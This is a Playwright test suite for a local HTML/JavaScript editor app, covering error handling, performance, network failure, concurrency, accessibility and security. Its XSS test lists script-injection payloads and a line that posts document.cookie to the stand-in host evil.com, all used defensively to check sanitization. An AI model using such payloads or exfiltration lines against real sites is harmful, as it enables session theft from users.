import { test, expect } from '@playwright/test';

test.describe('⚠️ Error Handling and Edge Cases', () => {
  test.beforeEach(async ({ page }) => {
    console.log('\n🛡️ Setting up error testing environment...');
    await page.goto('http://localhost:5173');
    await page.waitForLoadState('networkidle');
    
    // Set up console error monitoring
    page.on('console', msg => {
      if (msg.type() === 'error') {
        console.log(`  ❌ Console Error: ${msg.text()}`);
      }
    });
    
    // Set up page error monitoring  
    page.on('pageerror', error => {
      console.log(`  ❌ Page Error: ${error.message}`);
    });
  });

  test('Handling malformed JavaScript code', async ({ page }) => {
    console.log('\n🐛 Testing malformed JavaScript handling...');
    
    // Add JavaScript section
    console.log('Step 1: Adding JavaScript section...');
    const addJsButton = page.getByRole('button', { name: /add.*javascript/i }).first();
    await addJsButton.click();
    await page.waitForTimeout(500);
    
    const jsEditor = page.locator('.cm-content, textarea').last();
    await jsEditor.click();
    
    // Test various syntax errors
    const errorCases = [
      {
        name: 'Unclosed string',
        code: 'return "This string never closes',
        expectedError: 'string'
      },
      {
        name: 'Invalid syntax',
        code: 'return {]};',
        expectedError: 'syntax'
      },
      {
        name: 'Undefined variable',
        code: 'return undefinedVariable + 42;',
        expectedError: 'undefined'
      },
      {
        name: 'Infinite loop protection',
        code: 'while(true) { }',
        expectedError: 'timeout'
      },
      {
        name: 'Stack overflow',
        code: 'function recurse() { return recurse(); } return recurse();',
        expectedError: 'stack'
      }
    ];
    
    for (const testCase of errorCases) {
      console.log(`\nStep: Testing ${testCase.name}...`);
      
      // Clear and enter error code
      await jsEditor.click();
      await page.keyboard.press('Control+a');
      await page.keyboard.type(testCase.code);
      await page.waitForTimeout(1000);
      
      // Check for error display
      const errorDisplay = page.locator('.error, .error-message, [class*="error"]').first();
      const hasError = await errorDisplay.isVisible();
      console.log(`  ${hasError ? '✅' : '❌'} Error display ${hasError ? 'shown' : 'missing'}`);
      
      if (hasError) {
        const errorText = await errorDisplay.textContent();
        console.log(`  📝 Error message: "${errorText?.substring(0, 50)}..."`);
      }
      
      // Check that app didn't crash
      const appStillResponsive = await page.locator('body').isVisible();
      console.log(`  ${appStillResponsive ? '✅' : '❌'} App ${appStillResponsive ? 'still responsive' : 'crashed'}`);
    }
    
    await page.screenshot({
      path: 'screenshots/mcp-javascript-errors.png',
      fullPage: false
    });
  });

  test('Handling extreme input sizes', async ({ page }) => {
    console.log('\n📏 Testing extreme input sizes...');
    
    // Test very long content
    console.log('Step 1: Testing very long content...');
    const addHtmlButton = page.getByRole('button', { name: /add.*html/i }).first();
    await addHtmlButton.click();
    await page.waitForTimeout(500);
    
    const editor = page.locator('.cm-content, textarea').first();
    await editor.click();
    
    // Generate large content
    const largeContent = '<p>' + 'A'.repeat(10000) + '</p>';
    await page.keyboard.type(largeContent);
    await page.waitForTimeout(2000);
    
    console.log('  ✅ Large content (10KB) entered');
    
    // Check performance
    const startTime = Date.now();
    await editor.click();
    await page.keyboard.press('End');
    const responseTime = Date.now() - startTime;
    console.log(`  ⏱️ Response time: ${responseTime}ms`);
    console.log(`  ${responseTime < 1000 ? '✅' : '⚠️'} Performance ${responseTime < 1000 ? 'acceptable' : 'degraded'}`);
    
    // Test many sections
    console.log('\nStep 2: Testing many sections...');
    const sectionCount = 20;
    
    for (let i = 0; i < sectionCount; i++) {
      const button = i % 2 === 0 
        ? page.getByRole('button', { name: /add.*html/i }).first()
        : page.getByRole('button', { name: /add.*javascript/i }).first();
      
      await button.click();
      await page.waitForTimeout(100);
    }
    
    console.log(`  ✅ Created ${sectionCount} sections`);
    
    // Check if UI is still responsive
    const sections = page.locator('.section, [class*="section"]');
    const actualCount = await sections.count();
    console.log(`  📊 Verified ${actualCount} sections rendered`);
    
    // Test scrolling performance
    await page.evaluate(() => window.scrollTo(0, document.body.scrollHeight));
    await page.waitForTimeout(500);
    await page.evaluate(() => window.scrollTo(0, 0));
    console.log('  ✅ Scrolling still functional');
    
    await page.screenshot({
      path: 'screenshots/mcp-extreme-sizes.png',
      fullPage: false
    });
  });

  test('Network failure recovery', async ({ page }) => {
    console.log('\n🌐 Testing network failure recovery...');
    
    // Create content
    console.log('Step 1: Creating test content...');
    const addHtmlButton = page.getByRole('button', { name: /add.*html/i }).first();
    await addHtmlButton.click();
    await page.waitForTimeout(500);
    
    const editor = page.locator('.cm-content, textarea').first();
    await editor.click();
    await page.keyboard.type('<h1>Network Test Content</h1>');
    
    // Simulate network failure
    console.log('Step 2: Simulating network failure...');
    await page.route('**/*', route => {
      route.abort('failed');
    });
    console.log('  ✅ Network requests blocked');
    
    // Try to save/sync
    console.log('Step 3: Attempting operations during network failure...');
    const saveButton = page.getByRole('button', { name: /save/i }).first();
    if (await saveButton.isVisible()) {
      await saveButton.click();
      await page.waitForTimeout(1000);
      
      // Check for error handling
      const errorNotification = page.locator('.notification, .toast, [role="alert"]').first();
      const hasErrorNotification = await errorNotification.isVisible();
      console.log(`  ${hasErrorNotification ? '✅' : 'ℹ️'} Error notification ${hasErrorNotification ? 'shown' : 'not shown'}`);
    }
    
    // Check that local operations still work
    console.log('Step 4: Testing local operations...');
    await editor.click();
    await page.keyboard.press('End');
    await page.keyboard.type('\n<p>Added during network failure</p>');
    await page.waitForTimeout(500);
    
    const content = await editor.textContent();
    const localEditWorked = content?.includes('Added during network failure');
    console.log(`  ${localEditWorked ? '✅' : '❌'} Local editing ${localEditWorked ? 'still works' : 'failed'}`);
    
    // Restore network
    console.log('Step 5: Restoring network...');
    await page.unroute('**/*');
    await page.waitForTimeout(1000);
    console.log('  ✅ Network restored');
    
    // Check for auto-recovery
    const syncIndicator = page.locator('.sync, [aria-label*="sync" i]').first();
    if (await syncIndicator.isVisible()) {
      const syncText = await syncIndicator.textContent();
      console.log(`  ✅ Sync status: ${syncText}`);
    }
    
    await page.screenshot({
      path: 'screenshots/mcp-network-failure.png',
      fullPage: false
    });
  });

  test('Browser compatibility edge cases', async ({ page }) => {
    console.log('\n🌏 Testing browser compatibility edge cases...');
    
    // Test various browser APIs
    console.log('Step 1: Testing browser API availability...');
    const apiTests = await page.evaluate(() => {
      const tests = {
        localStorage: typeof localStorage !== 'undefined',
        sessionStorage: typeof sessionStorage !== 'undefined',
        indexedDB: typeof indexedDB !== 'undefined',
        webWorkers: typeof Worker !== 'undefined',
        serviceWorker: 'serviceWorker' in navigator,
        clipboard: 'clipboard' in navigator,
        notifications: 'Notification' in window,
        geolocation: 'geolocation' in navigator,
        webGL: (() => {
          try {
            const canvas = document.createElement('canvas');
            return !!(canvas.getContext('webgl') || canvas.getContext('experimental-webgl'));
          } catch(e) {
            return false;
          }
        })()
      };
      return tests;
    });
    
    for (const [api, available] of Object.entries(apiTests)) {
      console.log(`  ${available ? '✅' : 'ℹ️'} ${api}: ${available ? 'available' : 'not available'}`);
    }
    
    // Test with cookies disabled
    console.log('\nStep 2: Testing with cookies disabled...');
    const context = await browser.newContext({
      acceptDownloads: false,
      javaScriptEnabled: true,
      bypassCSP: false,
      userAgent: 'Mozilla/5.0 (Compatible; Test Browser)',
      viewport: { width: 1280, height: 720 },
      // Note: Actually disabling cookies requires browser launch options
    });
    
    const cookielessPage = await context.newPage();
    await cookielessPage.goto('http://localhost:5173');
    await cookielessPage.waitForLoadState('networkidle');
    
    const appLoaded = await cookielessPage.locator('body').isVisible();
    console.log(`  ${appLoaded ? '✅' : '❌'} App loads without cookies`);
    
    await cookielessPage.close();
    await context.close();
    
    // Test memory constraints
    console.log('\nStep 3: Testing memory constraints...');
    const memoryUsage = await page.evaluate(() => {
      if ('memory' in performance) {
        return {
          usedJSHeapSize: (performance as any).memory.usedJSHeapSize,
          totalJSHeapSize: (performance as any).memory.totalJSHeapSize,
          jsHeapSizeLimit: (performance as any).memory.jsHeapSizeLimit
        };
      }
      return null;
    });
    
    if (memoryUsage) {
      const usedMB = (memoryUsage.usedJSHeapSize / 1024 / 1024).toFixed(2);
      const totalMB = (memoryUsage.totalJSHeapSize / 1024 / 1024).toFixed(2);
      console.log(`  📊 Memory usage: ${usedMB}MB / ${totalMB}MB`);
      console.log(`  ${Number(usedMB) < 50 ? '✅' : '⚠️'} Memory usage ${Number(usedMB) < 50 ? 'optimal' : 'high'}`);
    }
    
    await page.screenshot({
      path: 'screenshots/mcp-browser-compatibility.png',
      fullPage: false
    });
  });

  test('Concurrent editing conflicts', async ({ page }) => {
    console.log('\n🔄 Testing concurrent editing conflicts...');
    
    // Simulate concurrent edits
    console.log('Step 1: Creating initial content...');
    const addHtmlButton = page.getByRole('button', { name: /add.*html/i }).first();
    await addHtmlButton.click();
    await page.waitForTimeout(500);
    
    const editor = page.locator('.cm-content, textarea').first();
    await editor.click();
    await page.keyboard.type('Initial content version 1');
    await page.waitForTimeout(500);
    
    // Simulate another "user" editing via localStorage
    console.log('Step 2: Simulating concurrent edit...');
    await page.evaluate(() => {
      const existingData = localStorage.getItem('workspace') || '{}';
      const data = JSON.parse(existingData);
      data.lastModified = new Date().toISOString();
      data.modifiedBy = 'other-user';
      data.content = 'Content modified by another user';
      localStorage.setItem('workspace', JSON.stringify(data));
      
      // Trigger storage event
      window.dispatchEvent(new StorageEvent('storage', {
        key: 'workspace',
        newValue: JSON.stringify(data),
        oldValue: existingData
      }));
    });
    
    await page.waitForTimeout(1000);
    
    // Check for conflict resolution
    console.log('Step 3: Checking conflict resolution...');
    const conflictDialog = page.locator('.conflict, [role="dialog"]').filter({ hasText: /conflict/i });
    const hasConflictDialog = await conflictDialog.isVisible();
    
    if (hasConflictDialog) {
      console.log('  ✅ Conflict dialog shown');
      
      // Check resolution options
      const keepLocal = page.getByRole('button', { name: /keep.*local/i });
      const keepRemote = page.getByRole('button', { name: /keep.*remote/i });
      const merge = page.getByRole('button', { name: /merge/i });
      
      console.log(`  ${await keepLocal.isVisible() ? '✅' : 'ℹ️'} Keep local option available`);
      console.log(`  ${await keepRemote.isVisible() ? '✅' : 'ℹ️'} Keep remote option available`);
      console.log(`  ${await merge.isVisible() ? '✅' : 'ℹ️'} Merge option available`);
    } else {
      console.log('  ℹ️ No conflict dialog (might auto-resolve)');
      
      // Check if content was updated
      const currentContent = await editor.textContent();
      console.log(`  📝 Current content: "${currentContent?.substring(0, 30)}..."`);
    }
    
    await page.screenshot({
      path: 'screenshots/mcp-concurrent-editing.png',
      fullPage: false
    });
  });

  test('Security and XSS prevention', async ({ page }) => {
    console.log('\n🔒 Testing security and XSS prevention...');
    
    // Test XSS in HTML sections
    console.log('Step 1: Testing XSS in HTML sections...');
    const addHtmlButton = page.getByRole('button', { name: /add.*html/i }).first();
    await addHtmlButton.click();
    await page.waitForTimeout(500);
    
    const editor = page.locator('.cm-content, textarea').first();
    await editor.click();
    
    const xssAttempts = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror="alert(\'XSS\')">',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<a href="javascript:alert(\'XSS\')">Click me</a>',
      '<svg onload="alert(\'XSS\')"></svg>'
    ];
    
    for (const xss of xssAttempts) {
      console.log(`\nTesting: ${xss.substring(0, 30)}...`);
      await editor.click();
      await page.keyboard.press('Control+a');
      await page.keyboard.type(xss);
      await page.waitForTimeout(1000);
      
      // Check if script executed (it shouldn't)
      const alertShown = await page.evaluate(() => {
        return new Promise(resolve => {
          const originalAlert = window.alert;
          window.alert = () => {
            window.alert = originalAlert;
            resolve(true);
          };
          setTimeout(() => resolve(false), 100);
        });
      });
      
      console.log(`  ${!alertShown ? '✅' : '❌'} XSS ${!alertShown ? 'prevented' : 'EXECUTED (SECURITY ISSUE!)'}`);
      
      // Check preview sanitization
      const preview = page.locator('.preview, [class*="preview"]').first();
      const previewHtml = await preview.innerHTML();
      const hasScriptTag = previewHtml.includes('<script') || previewHtml.includes('javascript:');
      console.log(`  ${!hasScriptTag ? '✅' : '❌'} Preview ${!hasScriptTag ? 'sanitized' : 'contains unsafe content'}`);
    }
    
    // Test XSS in JavaScript sections
    console.log('\nStep 2: Testing sandboxed JavaScript execution...');
    const addJsButton = page.getByRole('button', { name: /add.*javascript/i }).first();
    await addJsButton.click();
    await page.waitForTimeout(500);
    
    const jsEditor = page.locator('.cm-content, textarea').last();
    await jsEditor.click();
    
    const dangerousCode = [
      'document.cookie = "stolen=true"',
      'localStorage.setItem("hacked", "true")',
      'window.location = "https://evil.com"',
      'fetch("https://evil.com/steal", {method: "POST", body: document.cookie})'
    ];
    
    for (const code of dangerousCode) {
      console.log(`\nTesting: ${code.substring(0, 30)}...`);
      await jsEditor.click();
      await page.keyboard.press('Control+a');
      await page.keyboard.type(`return (function() { ${code}; return "Executed"; })();`);
      await page.waitForTimeout(1000);
      
      // Check if dangerous code was prevented
      const cookies = await page.context().cookies();
      const hasStolen = cookies.some(c => c.name === 'stolen');
      console.log(`  ${!hasStolen ? '✅' : '❌'} Cookie theft ${!hasStolen ? 'prevented' : 'SUCCESSFUL (SECURITY ISSUE!)'}`);
      
      const localStorage = await page.evaluate(() => localStorage.getItem('hacked'));
      console.log(`  ${!localStorage ? '✅' : '❌'} localStorage access ${!localStorage ? 'prevented' : 'SUCCESSFUL (SECURITY ISSUE!)'}`);
      
      const currentUrl = page.url();
      const wasRedirected = !currentUrl.includes('localhost');
      console.log(`  ${!wasRedirected ? '✅' : '❌'} Redirect ${!wasRedirected ? 'prevented' : 'SUCCESSFUL (SECURITY ISSUE!)'}`);
    }
    
    await page.screenshot({
      path: 'screenshots/mcp-security-xss.png',
      fullPage: false
    });
  });

  test('Resource cleanup and memory leaks', async ({ page }) => {
    console.log('\n🧹 Testing resource cleanup and memory leaks...');
    
    // Create and destroy many sections
    console.log('Step 1: Creating and destroying sections...');
    const iterations = 10;
    
    for (let i = 0; i < iterations; i++) {
      // Add section
      const addButton = page.getByRole('button', { name: /add.*html/i }).first();
      await addButton.click();
      await page.waitForTimeout(100);
      
      // Add some content
      const editor = page.locator('.cm-content, textarea').last();
      await editor.click();
      await page.keyboard.type(`Content ${i}`);
      await page.waitForTimeout(100);
      
      // Delete section
      const deleteButton = page.locator('button[aria-label*="delete" i], button[aria-label*="remove" i]').last();
      if (await deleteButton.isVisible()) {
        await deleteButton.click();
        await page.waitForTimeout(100);
      }
    }
    
    console.log(`  ✅ Created and destroyed ${iterations} sections`);
    
    // Check memory after cleanup
    const memoryAfter = await page.evaluate(() => {
      if ('memory' in performance) {
        // Force garbage collection if available
        if (typeof (global as any).gc === 'function') {
          (global as any).gc();
        }
        return (performance as any).memory.usedJSHeapSize;
      }
      return null;
    });
    
    if (memoryAfter) {
      const memoryMB = (memoryAfter / 1024 / 1024).toFixed(2);
      console.log(`  📊 Memory after cleanup: ${memoryMB}MB`);
      console.log(`  ${Number(memoryMB) < 100 ? '✅' : '⚠️'} Memory ${Number(memoryMB) < 100 ? 'properly cleaned' : 'possibly leaking'}`);
    }
    
    // Check for orphaned event listeners
    console.log('\nStep 2: Checking for orphaned event listeners...');
    const listenerCount = await page.evaluate(() => {
      const allElements = document.querySelectorAll('*');
      let count = 0;
      allElements.forEach(el => {
        // This is a rough check - actual implementation would need Chrome DevTools Protocol
        if ((el as any)._listeners || (el as any).__events) {
          count++;
        }
      });
      return count;
    });
    console.log(`  📊 Elements with potential listeners: ${listenerCount}`);
    
    // Check for detached DOM nodes
    console.log('\nStep 3: Checking for detached DOM nodes...');
    const detachedCheck = await page.evaluate(() => {
      const observer = new MutationObserver(() => {});
      const config = { childList: true, subtree: true };
      observer.observe(document.body, config);
      const records = observer.takeRecords();
      observer.disconnect();
      return records.length;
    });
    console.log(`  📊 Mutation records: ${detachedCheck}`);
    
    await page.screenshot({
      path: 'screenshots/mcp-resource-cleanup.png',
      fullPage: false
    });
  });

  test('Accessibility error handling', async ({ page }) => {
    console.log('\n♿ Testing accessibility error handling...');
    
    // Test keyboard-only navigation
    console.log('Step 1: Testing keyboard-only navigation...');
    
    // Try to navigate without mouse
    let tabCount = 0;
    const maxTabs = 20;
    const focusedElements = [];
    
    for (let i = 0; i < maxTabs; i++) {
      await page.keyboard.press('Tab');
      await page.waitForTimeout(100);
      
      const focused = await page.evaluate(() => {
        const el = document.activeElement;
        return {
          tag: el?.tagName,
          role: el?.getAttribute('role'),
          ariaLabel: el?.getAttribute('aria-label'),
          text: el?.textContent?.substring(0, 20)
        };
      });
      
      if (focused.tag !== 'BODY') {
        focusedElements.push(focused);
        tabCount++;
      }
    }
    
    console.log(`  📊 Accessible elements via Tab: ${tabCount}`);
    console.log(`  ✅ Can navigate with keyboard only`);
    
    // Test screen reader announcements
    console.log('\nStep 2: Testing ARIA live regions...');
    const liveRegions = await page.evaluate(() => {
      const regions = document.querySelectorAll('[aria-live], [role="alert"], [role="status"]');
      return Array.from(regions).map(r => ({
        role: r.getAttribute('role'),
        ariaLive: r.getAttribute('aria-live'),
        text: r.textContent?.substring(0, 50)
      }));
    });
    
    console.log(`  📊 Found ${liveRegions.length} live region(s)`);
    liveRegions.forEach(region => {
      console.log(`    - ${region.role || region.ariaLive}: "${region.text}..."`);
    });
    
    // Test error announcements
    console.log('\nStep 3: Testing error announcements...');
    
    // Trigger an error
    const addJsButton = page.getByRole('button', { name: /add.*javascript/i }).first();
    await addJsButton.click();
    await page.waitForTimeout(500);
    
    const jsEditor = page.locator('.cm-content, textarea').last();
    await jsEditor.click();
    await page.keyboard.type('invalid { code');
    await page.waitForTimeout(1000);
    
    // Check for accessible error announcement
    const errorAnnouncement = await page.evaluate(() => {
      const alerts = document.querySelectorAll('[role="alert"]');
      return Array.from(alerts).map(a => a.textContent);
    });
    
    console.log(`  ${errorAnnouncement.length > 0 ? '✅' : '⚠️'} Error announcements: ${errorAnnouncement.length}`);
    
    await page.screenshot({
      path: 'screenshots/mcp-accessibility-errors.png',
      fullPage: false
    });
  });

  test.afterEach(async ({ page }) => {
    console.log('\n🧹 Cleaning up error test environment...\n');
    await page.close();
  });
});